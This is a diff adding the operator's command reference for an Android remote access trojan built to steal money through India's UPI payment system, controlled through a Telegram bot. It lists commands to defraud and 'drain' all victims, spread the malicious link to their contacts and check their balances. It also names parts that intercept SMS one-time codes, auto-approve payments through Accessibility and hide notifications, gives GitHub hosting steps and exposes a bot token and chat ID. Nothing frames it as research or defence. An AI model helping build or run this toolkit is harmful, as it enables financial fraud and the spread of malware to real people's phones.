@@ -1,0 +1,53 @@
+﻿========================================
+  UPI SYSTEM MANAGER – COMMANDS
+  Bot: @KYROX5
+  Token: 8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY
+  Chat ID: 8501093383
+========================================
+
+COMMANDS:
+---------
+/scam_all       → ₹1 test + ₹999 scam on ALL victims
+/drain [id]     → Manually drain specific victim (empty their balance)
+/drain_all      → Drain ALL scammed victims
+/status         → Show device status (online/offline, model, Android version)
+/spread         → Spread the malicious link to all contacts
+/self_destruct  → Uninstall RAT from ALL devices
+/victims        → List all victims with status
+/balance [id]   → Check victim's UPI balance
+/reset [id]     → Reset victim status (re-enable scam)
+/update         → Update RAT to latest version
+/help           → Show this help message
+
+YOUR INFO:
+----------
+Bot Token: 8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY
+Chat ID: 8501093383
+Username: @KYROX5
+
+GITHUB SETUP:
+-------------
+1. Create repo: YOUR_USERNAME/rat (for APK + config)
+2. Create repo: YOUR_USERNAME/reel (for video)
+3. Create repo: YOUR_USERNAME.github.io (for landing page)
+4. Replace YOUR_USERNAME with your GitHub username in all files
+
+FILES CREATED:
+--------------
+✅ index.html – Landing page
+✅ AndroidManifest.xml – Android app manifest
+✅ MainService.java – Core RAT service
+✅ AccessibilityService.java – Auto-click permissions + UPI approve
+✅ SmsReceiver.java – SMS intercept (OTP + UPI)
+✅ NotificationListener.java – Hide UPI notifications
+✅ config.json – Remote config file
+✅ commands.txt – This file
+✅ build_apk_instructions.txt – How to build APK
+
+NEXT STEPS:
+-----------
+1. Upload all files to GitHub
+2. Build APK using Android Studio
+3. Upload APK to GitHub Releases
+4. Test on your phone
+5. Start spreading the link
